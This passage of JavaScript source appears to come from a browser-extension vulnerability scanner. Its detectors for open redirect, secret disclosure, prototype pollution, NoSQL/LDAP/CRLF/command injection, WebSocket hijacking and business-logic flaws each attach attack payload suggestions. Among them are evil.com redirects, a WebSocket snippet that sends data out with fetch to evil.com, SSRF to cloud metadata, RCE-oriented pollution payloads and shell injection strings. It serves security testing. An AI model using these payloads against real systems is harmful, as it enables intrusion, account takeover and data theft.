    // JSON endpoint CSRF — only when no CSRF defense of any recognised kind is present.
    if (/application\/json/i.test(ctx.html.slice(0, 50000)) && !csrfDefended) {
      findings.push({ type: "CSRF — JSON Endpoint", severity: "medium", detail: "JSON API without visible CSRF protection", location: url, category: "csrf", subtype: "json-csrf",
        suggestion: `JSON CSRF techniques:\n• Flash-based content-type override (legacy)\n• fetch() with credentials:'include' if CORS allows\n• Change Content-Type to text/plain (may bypass server check)\n• Enctype multipart trick: form with enctype="text/plain" + crafted name/value` });
    }

    return findings;
  }

  // ── 19. Open Redirect — All Sub-Types ──

  function detectOpenRedirect(ctx) {
    const findings = [];
    const url = ctx.url;
    const parsed = new URL(url);

    const redirP = ["redirect","redirect_uri","redirect_url","return","return_url","returnTo","return_to","next","next_url","url","uri","to","target","dest","destination","rurl","go","goto","out","continue","forward","checkout_url","login_url","logout_url","callback","ref","redir"];

    for (const [key, value] of parsed.searchParams) {
      if (!redirP.includes(key.toLowerCase())) continue;

      // Detect if it's an OAuth redirect
      const isOAuth = /oauth|authorize|callback|code|state/i.test(url);

      findings.push({
        type: isOAuth ? "Open Redirect — OAuth (Account Takeover)" : "Open Redirect — Standard",
        severity: isOAuth ? "critical" : "medium",
        detail: `"${key}"="${truncate(value, 50)}"${isOAuth ? " — OAuth flow → token/code theft" : ""}`,
        location: url, category: "open-redirect",
        subtype: isOAuth ? "oauth" : "standard",
        suggestion: isOAuth
          ? `OAuth redirect → account takeover:\n• ${key}=https://evil.com (steal auth code/token)\n• ${key}=https://evil.com%23.target.com\n• ${key}=https://target.com@evil.com\n• ${key}=//evil.com\n• Test: does the server validate redirect_uri strictly?\n• Subdomain: ${key}=https://evil.target.com\n• Path traversal: ${key}=https://target.com/../@evil.com`
          : `Open redirect payloads:\n• ${key}=https://evil.com\n• ${key}=//evil.com (protocol-relative)\n• ${key}=/\\evil.com  |  ${key}=////evil.com\n• ${key}=https://target.com@evil.com\n• ${key}=javascript:alert(1) (→ XSS)\n• ${key}=https://evil.com%252f.target.com (double encode)\n• ${key}=%0d%0aLocation:https://evil.com (header injection)\nChaining opportunities:\n• Open Redirect → OAuth token theft: use redirect as redirect_uri in OAuth flow\n  /oauth/authorize?redirect_uri=https://target.com/path?${key}=https://evil.com\n• Open Redirect → SSRF: if server follows the redirect internally\n  ${key}=http://127.0.0.1 or ${key}=http://169.254.169.254/\n• Open Redirect → Phishing: redirect to cloned login page\n• Open Redirect → XSS: ${key}=javascript:alert(document.domain)`
      });
    }

    // Meta redirect / JS redirect
    if (/meta.*http-equiv.*refresh.*url/i.test(ctx.html.slice(0,50000))) {
      findings.push({ type: "Open Redirect — Meta Refresh", severity: "low", detail: "Meta refresh redirect found", location: url, category: "open-redirect", subtype: "meta-refresh" });
    }

    return findings;
  }

  // ── 20. Information Disclosure — All Sub-Types ──

  function detectInfoDisclosure(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 200000);
    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 150000);
    const allText = html + "\n" + scripts;

    // ── API Keys & Tokens ──
    const secrets = [
      { p: /AKIA[0-9A-Z]{16}/g, n: "AWS Access Key", sev: "critical", sub: "cloud-credentials" },
      { p: /(?:aws[_-]?secret|secret[_-]?access)\s*[:=]\s*['"][A-Za-z0-9/+=]{40}['"]/gi, n: "AWS Secret Key", sev: "critical", sub: "cloud-credentials" },
      { p: /ghp_[A-Za-z0-9_]{36}/g, n: "GitHub PAT", sev: "critical", sub: "vcs-token" },
      { p: /glpat-[A-Za-z0-9_\-]{20}/g, n: "GitLab PAT", sev: "critical", sub: "vcs-token" },
      { p: /sk-[A-Za-z0-9]{48}/g, n: "OpenAI API Key", sev: "critical", sub: "ai-key" },
      { p: /sk-ant-[A-Za-z0-9_\-]{80,}/g, n: "Anthropic API Key", sev: "critical", sub: "ai-key" },
      { p: /xox[bpsar]-[A-Za-z0-9\-]{10,}/g, n: "Slack Token", sev: "critical", sub: "messaging-token" },
      { p: /sk_live_[A-Za-z0-9]{24,}/g, n: "Stripe Secret Key", sev: "critical", sub: "payment-key" },
      { p: /SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}/g, n: "SendGrid Key", sev: "critical", sub: "email-key" },
      { p: /AIza[A-Za-z0-9_\-]{35}/g, n: "Google API Key", sev: "high", sub: "cloud-credentials" },
      { p: /ya29\.[A-Za-z0-9_\-]+/g, n: "Google OAuth Token", sev: "critical", sub: "oauth-token" },
      { p: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g, n: "Private Key (PEM/SSH)", sev: "critical", sub: "private-key" },
      { p: /(?:mongodb|postgres(?:ql)?|mysql|redis|amqp):\/\/[^\s<>"']+/gi, n: "Database Connection String", sev: "critical", sub: "db-credentials" },
      { p: /(?:password|passwd|pwd)\s*[:=]\s*['"][^'"]{4,}['"]/gi, n: "Hardcoded Password", sev: "critical", sub: "password" },
      { p: /(?:api[_-]?key|apikey)\s*[:=]\s*['"][A-Za-z0-9_\-]{16,}['"]/gi, n: "Generic API Key", sev: "high", sub: "api-key" },
      { p: /Bearer\s+[A-Za-z0-9_\-\.]{20,}/g, n: "Bearer Token", sev: "high", sub: "auth-token" },
    ];

    for (const { p, n, sev, sub } of secrets) {
      const m = allText.match(p);
      if (m) findings.push({ type: `Secrets — ${n}`, severity: sev, detail: `${n}: ${truncate(m[0], 50)} (${m.length}x)`, location: "Page source", category: "info-disclosure", subtype: sub,
        suggestion: `Verify if active. If valid → report immediately as critical info disclosure.\nRevocation guides vary by provider — include in report.` });
    }

    // ── Basic Auth (base64) — validated ── (P5E)
    // "Basic <blob>" only counts if <blob> actually base64-decodes to a printable credential
    // containing a colon (user:pass). This rejects page words like "Basic clickjacking",
    // "Basic authentication", etc. that merely start with the word "Basic".
    for (const bm of (allText.match(/Basic\s+([A-Za-z0-9+/]{12,}={0,2})/g) || [])) {
      const b64 = bm.replace(/^Basic\s+/, "");
      let decoded = "";
      try { decoded = atob(b64); } catch { continue; }
      if (/^[\x20-\x7e]+$/.test(decoded) && decoded.includes(":") && decoded.length >= 3) {
        findings.push({ type: "Secrets — Basic Auth (base64)", severity: "high", detail: `Basic Auth credential in page source (decodes to ${truncate(decoded.split(":")[0], 20)}:***)`, location: "Page source", category: "info-disclosure", subtype: "auth-token",
          suggestion: "Decode the base64 to recover user:pass and verify whether the credentials are live." });
        break;
      }
    }

    // ── Source Maps ──
    if (/\/\/[#@]\s*sourceMappingURL\s*=\s*\S+/i.test(allText)) {
      findings.push({ type: "Secrets — Source Map", severity: "medium", detail: "JS source map → original unminified source", location: "Page source", category: "info-disclosure", subtype: "source-map",
        suggestion: "Fetch .map file for full source code — search for hardcoded secrets, internal endpoints, business logic." });
    }

    // ── Stack Traces ──
    if (/at\s+\w+\s+\(.*:\d+:\d+\)|Traceback \(most recent|Exception in thread|Fatal error:.*on line/i.test(html)) {
      findings.push({ type: "Secrets — Stack Trace", severity: "medium", detail: "Server error/stack trace exposed", location: "Page source", category: "info-disclosure", subtype: "stack-trace" });
    }

    // ── Debug Endpoints ──
    const dbg = allText.match(/['"]\/(?:debug|admin|test|staging|internal|dev|backup|dump|phpinfo|server-status|server-info|elmah|trace|health|metrics|actuator|env|configprops|heapdump|jolokia|console)[^'"]*['"]/gi);
    if (dbg) {
      const u = [...new Set(dbg.map(e => e.replace(/['"]/g, "")))];
      findings.push({ type: "Secrets — Debug Endpoints", severity: "high", detail: `${u.length} endpoint(s): ${u.slice(0,5).join(", ")}`, location: "Page source", category: "info-disclosure", subtype: "debug-endpoint",
        suggestion: "Access each. /actuator/env, /heapdump, /phpinfo, /server-status can leak full server config, env vars, and credentials." });
    }

    // ── HTML Comments ──
    const comments = html.match(/<!--[\s\S]*?-->/g) || [];
    const sensitive = comments.filter(c => /todo|fixme|hack|password|secret|token|admin|internal|deprecated|debug|credentials|key/i.test(c));
    if (sensitive.length > 0) {
      findings.push({ type: "Secrets — HTML Comments", severity: "low", detail: `${sensitive.length} comment(s) with sensitive keywords`, location: "Page source", category: "info-disclosure", subtype: "html-comment" });
    }

    // ── Directory Listing ──
    if (/Index of\s+\/|Directory listing for\s+\/|<title>\s*Directory:\s/i.test(html) ||
        (/<pre>/.test(html) && /Parent Directory/i.test(html)) ||
        (/\[To Parent Directory\]/i.test(html))) {
      findings.push({ type: "Directory Listing Enabled", severity: "medium", detail: "Directory browsing is enabled — exposes file structure", location: "Page source", category: "info-disclosure", subtype: "directory-listing",
        suggestion: "Directory listing reveals file names and structure. Check for backup files (.bak, .old, .sql), config files, and unlinked pages." });
    }

    // ── Error Page Info Disclosure ──
    if (/Server Error in '.*' Application|Runtime Error|Version Information:.*ASP\.NET|Unhandled Exception|<b>Description:<\/b>/i.test(html)) {
      findings.push({ type: "Error Page — Framework Disclosure", severity: "medium", detail: "Verbose error page reveals framework version and internals", location: "Page source", category: "info-disclosure", subtype: "error-page" });
    }
    if (/Microsoft\.NET|System\.Web|System\.Data|NullReferenceException|SqlException|InvalidOperationException/i.test(html)) {
      findings.push({ type: "Error Page — .NET Stack Trace", severity: "high", detail: ".NET exception details exposed — reveals internal class names and methods", location: "Page source", category: "info-disclosure", subtype: "stack-trace" });
    }

    // ── Version in Meta/Headers reflected in page ──
    const genMeta = document.querySelector('meta[name="generator"]');
    if (genMeta) {
      findings.push({ type: "Technology Disclosure", severity: "info", detail: `Generator meta tag: "${genMeta.content}"`, location: "Meta tag", category: "recon", subtype: "generator" });
    }

    return findings;
  }

  // ── 21. Prototype Pollution — Sub-Types ──

  function detectPrototypePollution(ctx) {
    const findings = [];
    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 100000);

    // Client-side PP
    const clientSinks = [
      { p: /\.merge\s*\(/g, n: "Object merge" }, { p: /\.extend\s*\(/g, n: "Object extend" },
      { p: /Object\.assign\s*\(/g, n: "Object.assign" }, { p: /lodash|_\.merge|_\.defaults|_\.defaultsDeep/gi, n: "Lodash deep merge" },
      { p: /deepmerge|deep[_-]?extend/gi, n: "Deep merge lib" }, { p: /\.__proto__/g, n: "__proto__ access" },
      { p: /\["__proto__"\]/g, n: "__proto__ bracket" }, { p: /\["constructor"\]\s*\["prototype"\]/g, n: "constructor.prototype" },
    ];

    const found = clientSinks.filter(s => s.p.test(scripts));
    if (found.length > 0) {
      findings.push({
        type: "Prototype Pollution — Client-side",
        severity: "high",
        detail: `Sinks: ${found.map(f=>f.n).join(", ")}`,
        location: "Inline scripts", category: "prototype-pollution", subtype: "client-side",
        suggestion: `Client-side PP → XSS:\n• URL: ?__proto__[innerHTML]=<img/src/onerror=alert(1)>\n• URL: ?__proto__[srcdoc]=<script>alert(1)</script>\n• JSON: {"__proto__":{"isAdmin":true}}\n• constructor.prototype: ?constructor[prototype][isAdmin]=true\n• Gadget hunting: look for Object.create, template literals, DOM rendering`
      });
    }

    // Server-side PP indicators
    if (/express|node|npm|package\.json|require\(/i.test(scripts + ctx.html.slice(0,50000))) {
      const hasJsonInput = /application\/json|content-type.*json/i.test(ctx.html.slice(0,50000));
      if (hasJsonInput) {
        findings.push({
          type: "Prototype Pollution — Server-side (Node.js)",
          severity: "medium",
          detail: "Node.js + JSON input detected — server-side PP may lead to RCE",
          location: "Page source", category: "prototype-pollution", subtype: "server-side",
          suggestion: `Server-side PP → RCE (Node.js):\n• {"__proto__":{"shell":"/proc/self/exe","NODE_OPTIONS":"--require /proc/self/cmdline","env":{"EVIL":"console.log(1)//"}}}\n• {"__proto__":{"status":510,"exposedHeaders":["*"]}}\n• Gadgets: ejs, pug, handlebars template engines\n• child_process.exec with polluted env vars\n• Test: send {"__proto__":{"test":1}} and check if Object.test === 1 in response`
        });
      }
    }

    return findings;
  }

  // ── 22. NoSQL Injection — Sub-Types ──

  function detectNoSQLi(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);
    const url = ctx.url;

    const aspnetIndicators = /asp\.net|__VIEWSTATE|__EVENTTARGET|SqlException|System\.Data\.Sql|System\.Web\.|\.aspx|\.ashx|\.asmx/i;
    const sqlTechIndicators = /jdbc:oracle|jdbc:mysql|jdbc:postgresql|com\.microsoft\.sqlserver|System\.Data\.SqlClient|pg_catalog|information_schema\.tables/i;
    if (aspnetIndicators.test(html) || sqlTechIndicators.test(html)) return findings;

    const nosqlDBs = [
      { p: /mongodb|mongoose|mongoclient/i, n: "MongoDB" },
      { p: /couchdb|couchbase/i, n: "CouchDB" },
      { p: /firebase|firestore/i, n: "Firebase" },
      { p: /dynamodb/i, n: "DynamoDB" },
      { p: /elasticsearch|elastic/i, n: "Elasticsearch" },
      { p: /redis/i, n: "Redis" },
    ];

    const detected = nosqlDBs.filter(d => d.p.test(html));

    // P5F: a NoSQL tech name appearing in page text is NOT injection evidence. Only surface a
    // NoSQLi lead when there is an actual injectable input — an auth form or a query/search
    // parameter — and emit ONE consolidated lead instead of three speculative findings.
    const nqParams = [...new URL(url).searchParams.keys()];
    const nqQuery = nqParams.some(k => /user|name|login|email|search|^q$|query|id|filter|pass/i.test(k));
    const nqAuthForm = (ctx.forms || []).some(f => {
      const names = [...f.querySelectorAll("input")].map(el => el.name || el.id || "");
      return names.some(n => /user|email|login/i.test(n)) && names.some(n => /pass|pwd/i.test(n));
    });
    if (detected.length > 0 && (nqQuery || nqAuthForm)) {
      findings.push({
        type: "NoSQLi — Operator/Query Injection (lead)",
        severity: "medium",
        detail: `${detected.map(d => d.n).join(", ")} in use and an injectable ${nqAuthForm ? "auth form" : "query parameter"} is present — test operator / $where injection. Unconfirmed.`,
        location: url, category: "nosqli", subtype: "operator",
        suggestion: `On the auth/query input:\n• Auth bypass: username[$ne]=x&password[$ne]=y  |  {"username":{"$ne":""},"password":{"$ne":""}}\n• Regex extraction: {"password":{"$regex":"^a"}}\n• $where (if evaluated server-side): {"$where":"sleep(5000)"}`
      });
    }

    return findings;
  }

  // ── 23. LDAP Injection — Sub-Types ──

  function detectLDAPi(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);

    // P5F: an LDAP/AD mention in page text is not injection evidence. Only surface a lead when
    // there is an actual auth form to inject into, and as a single consolidated finding.
    if (!/ldap|active.directory|ldaps?:\/\//i.test(html)) return findings;
    const ldAuthForm = (ctx.forms || []).some(f => {
      const names = [...f.querySelectorAll("input")].map(el => el.name || el.id || "");
      return names.some(n => /user|email|login/i.test(n)) && names.some(n => /pass|pwd/i.test(n));
    });
    if (!ldAuthForm) return findings;

    findings.push({
      type: "LDAP Injection — Auth Bypass (lead)",
      severity: "medium",
      detail: "LDAP/AD is referenced and an auth form is present — test LDAP metacharacter injection on the login. Unconfirmed.",
      location: ctx.url, category: "ldap-injection", subtype: "auth-bypass",
      suggestion: `Auth bypass payloads on the login form:\n• *)(&  |  admin)(&)  |  username=*  |  username=admin)(|(password=*)`
    });

    return findings;
  }

  // ── 24. CRLF Injection — Sub-Types ──

  function detectCRLF(ctx) {
    const findings = [];
    const url = ctx.url;
    const parsed = new URL(url);
    const headerP = ["redirect","url","return","returnTo","next","goto","forward","location","lang","locale","callback","page"];

    for (const [key] of parsed.searchParams) {
      if (!headerP.includes(key.toLowerCase())) continue;

      findings.push({
        type: "CRLF — HTTP Response Splitting",
        severity: "medium",
        detail: `"${key}" may be reflected in response headers`,
        location: url, category: "crlf", subtype: "response-splitting",
        suggestion: `Response splitting:\n• ${key}=value%0d%0aInjected-Header:true\n• ${key}=value%0d%0a%0d%0a<html>XSS</html> (full response injection)\n• ${key}=value%0d%0aSet-Cookie:admin=1 (session fixation)`
      });
      findings.push({
        type: "CRLF — Cache Poisoning",
        severity: "medium",
        detail: `If cached (CDN/proxy), CRLF can poison cache for all users`,
        location: url, category: "crlf", subtype: "cache-poisoning",
        suggestion: `Cache poisoning via CRLF:\n• Inject X-Forwarded-Host + CRLF in headers\n• ${key}=value%0d%0aX-Cache-Poisoned:1\n• Serve malicious content to all users via CDN cache\n• Unicode CRLF: %E5%98%8A%E5%98%8D (bypasses some filters)`
      });
      break;
    }

    return findings;
  }

  // ── 25. Host Header Injection — Sub-Types ──

  function detectHostHeader(ctx) {
    const findings = [];
    // P5D: Host-header issues are not observable from the DOM. Cache poisoning needs real
    // cache-header/behavior evidence a content script can't see, so it is no longer emitted
    // from page text (it fired on any page merely mentioning "cache"/"cloudflare"). Surface a
    // password-reset lead ONLY when an actual reset form exists, and only at INFO.
    const resetForm = (ctx.forms || []).some(f => {
      const ctxStr = (f.getAttribute("action") || "") + " " + [...f.querySelectorAll("input")].map(el => el.name || el.id || "").join(" ");
      return /forgot|reset|recover/i.test(ctxStr) && [...f.querySelectorAll("input")].some(el => /email|user|login/i.test(el.name || el.id || ""));
    });
    if (resetForm) {
      findings.push({
        type: "Host Header — Password Reset (lead)",
        severity: "info",
        detail: "A password-reset form is present. IF reset links are built from the Host / X-Forwarded-Host header, poisoning it can hijack reset tokens — unconfirmed, verify manually.",
        location: ctx.url, category: "host-header", subtype: "reset-poisoning",
        suggestion: `Verify manually:\n• Request a reset with Host: evil.example and check whether the emailed link uses that host.\n• Also try X-Forwarded-Host / X-Host / Forwarded: host=.`
      });
    }

    return findings;
  }

  // ── 26. Race Conditions — Sub-Types ──

  function detectRaceConditions(ctx) {
    const findings = [];
    const formText = ctx.forms.map(f => {
      const action = f.getAttribute("action") || "";
      const inputs = [...f.querySelectorAll("input,textarea,select,button")].map(el => (el.name || el.textContent || "").toLowerCase()).join(" ");
      return action.toLowerCase() + " " + inputs;
    }).join(" ");
    const url = ctx.url;

    const raceTypes = [
      { p: /coupon|promo|discount|voucher/i, n: "Coupon/Discount", sub: "limit-bypass", s: "Apply same coupon concurrently to stack discounts or bypass single-use", sev: "high" },
      { p: /withdraw|transfer|send.*money|payment|checkout|purchase/i, n: "Financial Transaction", sub: "toctou-financial", s: "Double-spend: send concurrent withdraw/transfer requests to overdraw balance", sev: "critical" },
      { p: /like|upvote|downvote|vote|favorite/i, n: "Like/Vote", sub: "counter-overflow", s: "Inflate counters beyond limits via concurrent requests", sev: "medium" },
      { p: /redeem|claim|reward|bonus|credits?|points?/i, n: "Reward/Credit", sub: "claim-race", s: "Claim same reward multiple times via concurrent requests", sev: "high" },
      { p: /invite|referral|signup.*bonus/i, n: "Invite/Referral", sub: "referral-abuse", s: "Race invite creation for duplicate referral bonuses", sev: "medium" },
      { p: /add.*cart|quantity|stock|inventory/i, n: "Cart/Inventory", sub: "inventory-race", s: "Purchase out-of-stock items or exceed quantity limits via race", sev: "medium" },
      { p: /follow|subscribe|connect|friend/i, n: "Follow/Subscribe", sub: "social-race", s: "Bypass follow limits or create duplicate relationships", sev: "low" },
      { p: /upload|import/i, n: "File Processing", sub: "file-race", s: "Upload then access before server-side validation completes (race to web shell)", sev: "high" },
    ];

    for (const { p, n, sub, s, sev } of raceTypes) {
      if (p.test(formText) || p.test(url)) {
        findings.push({
          type: `Race Condition — ${n}`,
          severity: sev,
          detail: `${n} — ${s}`,
          location: url, category: "race-condition", subtype: sub,
          suggestion: `${s}\n\nTools & technique:\n• Burp Turbo Intruder (single-packet attack)\n• HTTP/2: send all requests in single TCP packet\n• race-the-web, racepwn\n• Custom: asyncio/threading with 20-50 concurrent requests\n• Look for check-then-act patterns (balance check → deduction)`
        });
      }
    }

    return findings;
  }

  // ── 27. HTTP Request Smuggling — Sub-Types ──

  function detectRequestSmuggling(ctx) {
    const findings = [];
    // P5F/P6: request smuggling cannot be detected passively from page content — this fired
    // "Smuggling — CL.TE/TE.CL" merely because a proxy NAME (nginx/apache/x-forwarded) appeared
    // in page text, which is not evidence of a CL/TE desync. Suppressed.
    return findings;
    // eslint-disable-next-line no-unreachable
    const html = ctx.html.slice(0, 100000);

    const proxies = [
      { p: /nginx/i, n: "Nginx" }, { p: /apache/i, n: "Apache" }, { p: /haproxy/i, n: "HAProxy" },
      { p: /varnish/i, n: "Varnish" }, { p: /traefik/i, n: "Traefik" }, { p: /envoy/i, n: "Envoy" },
      { p: /x-forwarded|x-real-ip|via:/i, n: "Proxy headers" },
    ];
    const detected = proxies.filter(p => p.p.test(html)).map(p => p.n);
    if (detected.length === 0) return findings;

    findings.push({
      type: "Smuggling — CL.TE",
      severity: "medium",
      detail: `Proxies: ${detected.join(", ")} — test Content-Length vs Transfer-Encoding desync`,
      location: "Page source", category: "request-smuggling", subtype: "cl-te",
      suggestion: `CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding:\nPOST / HTTP/1.1\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED`
    });
    findings.push({
      type: "Smuggling — TE.CL",
      severity: "medium",
      detail: "Transfer-Encoding front-end, Content-Length back-end",
      location: "Page source", category: "request-smuggling", subtype: "te-cl",
      suggestion: `TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length:\nPOST / HTTP/1.1\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0`
    });
    findings.push({
      type: "Smuggling — HTTP/2 Desync",
      severity: "medium",
      detail: "If site supports HTTP/2 — test H2.CL and H2.TE desync",
      location: "Page source", category: "request-smuggling", subtype: "h2-desync",
      suggestion: `HTTP/2 smuggling:\n• H2.CL: HTTP/2 request with Content-Length pseudo-header targeting HTTP/1.1 backend\n• H2.TE: HTTP/2 with Transfer-Encoding header\n• Request tunneling via CONNECT\n• Tool: Burp HTTP Request Smuggler extension`
    });

    return findings;
  }

  // ── 28. Subdomain Takeover ──

  function detectSubdomainTakeover(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);
    const takeoverSvcs = ["s3.amazonaws.com","cloudfront.net","herokuapp.com","github.io","azurewebsites.net","netlify.app","ghost.io","myshopify.com","tumblr.com","wordpress.com","pantheon.io","surge.sh","fly.dev","vercel.app","pages.dev","web.app"];

    for (const svc of takeoverSvcs) {
      const re = new RegExp(`[a-z0-9.-]+\\.${svc.replace(/\./g, '\\.')}`, 'gi');
      const m = html.match(re);
      if (m) {
        findings.push({ type: "Subdomain Takeover — " + svc, severity: "medium", detail: `References: ${[...new Set(m)].slice(0,3).join(", ")}`, location: "Page source", category: "subdomain-takeover", subtype: svc.split(".")[0],
          suggestion: `Check if the ${svc} resource exists. If 404/unclaimed → register it to take over.\nTools: subjack, nuclei, can-i-take-over-xyz` });
      }
    }
    return findings;
  }

  // ── 29. WebSocket Vulnerabilities — Sub-Types ──

  function detectWebSocket(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);
    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 100000);

    const wsUrls = [];
    let m; const wsPat = /new\s+WebSocket\s*\(\s*['"`]([^'"`]+)['"`]/g;
    while ((m = wsPat.exec(scripts)) !== null) wsUrls.push(m[1]);

    if (wsUrls.length > 0 || /wss?:\/\//i.test(html)) {
      findings.push({ type: "WebSocket — CSWSH (Cross-Site Hijacking)", severity: "high",
        detail: `WS endpoint(s): ${wsUrls.join(", ") || "detected"}`, location: "Page source", category: "websocket", subtype: "cswsh",
        suggestion: `CSWSH — connect from attacker page if no Origin validation:\n• var ws = new WebSocket('${wsUrls[0]||"wss://target/ws"}');\n• ws.onmessage = function(e) { fetch('https://evil.com/?d='+e.data); }\n• If Origin not checked → steal data from authenticated WS session` });
      findings.push({ type: "WebSocket — Message Injection", severity: "medium",
        detail: "WS messages may be parsed unsafely server-side", location: "Page source", category: "websocket", subtype: "message-injection",
        suggestion: `Inject in WS messages:\n• SQLi: {"query":"' OR 1=1--"}\n• CMDi: {"cmd":"; whoami"}\n• XSS: {"message":"<img src=x onerror=alert(1)>"}\n• Prototype pollution: {"__proto__":{"isAdmin":true}}` });
    }

    if (/socket\.io/i.test(html + scripts)) {
      findings.push({ type: "WebSocket — Socket.IO Event Injection", severity: "medium",
        detail: "Socket.IO — custom events may lack validation", location: "Page source", category: "websocket", subtype: "socketio",
        suggestion: "Connect with socket.io-client, enumerate events, send crafted payloads to each event handler." });
    }

    return findings;
  }

  // ── 30. Business Logic — Sub-Types ──

  function detectBusinessLogic(ctx) {
    const findings = [];
    const url = ctx.url;
    const formText = ctx.forms.map(f => {
      const action = f.getAttribute("action") || "";
      const inputs = [...f.querySelectorAll("input,textarea,select,button")].map(el => (el.name || el.textContent || "").toLowerCase()).join(" ");
      return action.toLowerCase() + " " + inputs;
    }).join(" ");

    const bizTypes = [
      { p: /price|amount|total|cost|fee|tax|subtotal/i, n: "Price Manipulation", sub: "price-tampering", sev: "high",
        s: "Modify price/amount to 0, -1, or 0.01. Change currency. Apply discounts post-payment." },
      { p: /role.*=|user_?type|account_?type|plan|tier|subscription|premium/i, n: "Privilege Escalation", sub: "privilege-escalation", sev: "high",
        s: "Change role=admin, plan=enterprise, is_premium=true, account_type=staff." },
      { p: /step|wizard|stage|phase|progress/i, n: "Multi-Step Bypass", sub: "step-skip", sev: "medium",
        s: "Skip steps by accessing later stage URLs directly. Modify step/state params." },
      { p: /verify|verification|confirm|approval|approve|pending/i, n: "Verification Bypass", sub: "verification-bypass", sev: "medium",
        s: "Access post-verification endpoints directly. Modify verification_status=approved." },
      { p: /limit|max_|min_|threshold|quota|allow/i, n: "Limit/Threshold Bypass", sub: "limit-bypass", sev: "medium",
        s: "Test boundaries: 0, -1, 999999999, MAX_INT. Race conditions on limit checks." },
      { p: /email.*change|change.*email|update.*email/i, n: "Email Change → Account Takeover", sub: "email-change-ato", sev: "high",
        s: "Chain email change with password reset. Check: does old email get notified? Is current password required?" },
      { p: /delete|remove|destroy|cancel/i, n: "Destructive Action Bypass", sub: "mass-assignment", sev: "medium",
        s: "Test IDOR on delete endpoints. Mass assignment: add is_admin=true to update requests." },
      { p: /2fa|mfa|two.factor|otp|authenticator/i, n: "2FA/MFA Present — Test For Bypass", sub: "2fa-bypass", sev: "info",
        s: "MFA appears to be present. This is NOT a finding by itself. To test for a bypass: try skipping to the post-2FA endpoint, check OTP rate limiting, null/empty OTP, and response manipulation. Only report if a bypass actually works." },
    ];

    // 2FA/MFA bypass: only meaningful if the page actually implements MFA.
    // Look for an OTP-like input or an explicit authenticator reference as evidence.
    const mfaInput = ctx.inputs.find(el => {
      const hay = `${el.name||""} ${el.id||""} ${el.placeholder||""} ${el.getAttribute?.("autocomplete")||""}`.toLowerCase();
      const otpLen = (el.maxLength >= 4 && el.maxLength <= 8);
      return /otp|mfa|2fa|totp|one.?time|verification.?code|auth.?code|security.?code/.test(hay) ||
             (otpLen && /code|pin|token/.test(hay)) || el.getAttribute?.("autocomplete") === "one-time-code";
    });
    const mfaText = /authenticator app|authentication code|verification code|one.?time (?:passcode|password|code)|enter the code|6-digit code/i.test(formText);
    const mfaEvidence = mfaInput ? `OTP-like input found: ${(mfaInput.name||mfaInput.id||mfaInput.placeholder||"unnamed")}` : (mfaText ? "Authenticator/verification-code text present on page" : "");

    for (const { p, n, sub, sev, s } of bizTypes) {
      if (p.test(formText) || p.test(url)) {
        // Suppress the MFA-bypass indicator entirely when there is no evidence MFA exists.
        if (sub === "2fa-bypass" && !mfaEvidence) continue;
        const entry = { type: `BizLogic — ${n}`, severity: sev, detail: s, location: url, category: "business-logic", subtype: sub,
          suggestion: s + "\n\nGeneral business logic testing:\n• Parameter tampering (modify hidden/disabled fields)\n• Negative values, zero amounts, extreme numbers\n• Race conditions on state-changing operations\n• IDOR on every numeric/UUID identifier\n• Test with multiple roles (user, admin, unauthenticated)" };
        if (sub === "2fa-bypass") entry.evidence = mfaEvidence;
        findings.push(entry);
      }
    }

    // Hidden price fields
    const hpf = ctx.inputs.filter(el => el.type === "hidden" && /price|amount|cost|total|discount/i.test(el.name));
    if (hpf.length > 0) {
      findings.push({ type: "BizLogic — Hidden Price Fields", severity: "high",
        detail: `${hpf.length} hidden price field(s): ${hpf.map(el=>`${el.name}=${el.value}`).slice(0,3).join(", ")}`,
        location: url, category: "business-logic", subtype: "price-tampering",
        suggestion: "Modify hidden fields in DevTools/Burp. Set to 0, 0.01, or negative." });
    }

    return findings;
  }


  // ── 31. Command Injection Detection — Dedicated Scanner ──

  function detectCommandInjection(ctx) {
    const findings = [];
    const url = ctx.url;
    const parsed = new URL(url);
    const html = ctx.html.slice(0, 150000);
    const params = [...parsed.searchParams.entries()];

    const cmdiParams = [
      "cmd","exec","command","execute","run","shell","system",
      "ping","host","ip","domain","port","target","dest",
      "dir","path","file","filename","download","log",
      "cli","arg","func","process","daemon","timeout",
      "address","hostname","nslookup","dig","traceroute",
      "curl","wget","ftp","ssh","nc","nmap"
    ];
    const aspnetIgnore = /^__(?:VIEWSTATE|EVENTVALIDATION|EVENTTARGET|EVENTARGUMENT|VIEWSTATEGENERATOR|PREVIOUSPAGE|SCROLLPOS)/i;

    const cmdOutputPatterns = [
      /uid=\d+\([^)]+\)\s+gid=\d+/i,
      /root:x:0:0:/,
      /\/(bin|usr|sbin)\/(bash|sh|zsh|fish)/,
      /total\s+\d+\s+drwx/,
      /\d+\s+bytes\s+(from|transmitted)/i,
      /PING\s+\S+\s+\(\d+\.\d+\.\d+\.\d+\)/,
      /traceroute\s+to/i,
      /nslookup|Non-authoritative answer/i,
      /Microsoft Windows \[Version/i,
      /Directory of [A-Z]:\\/i,
      /inet\s+\d+\.\d+\.\d+\.\d+/,
      /Linux\s+\S+\s+\d+\.\d+/,
    ];

    for (const [key, value] of params) {
      const lk = key.toLowerCase();
      if (aspnetIgnore.test(key)) continue;
      if (cmdiParams.includes(lk)) {
        findings.push({
          type: "CMDi — Suspicious Parameter",
          severity: "high",
          detail: `"${key}=${truncate(value, 60)}" — command injection vector`,
          location: url,
          category: "command-injection",
          subtype: "parameter",
          suggestion: `Command injection payloads for "${key}":\n` +
            `• Concat: ${key}=;id  |  ${key}=|whoami  |  ${key}=\`id\`\n` +
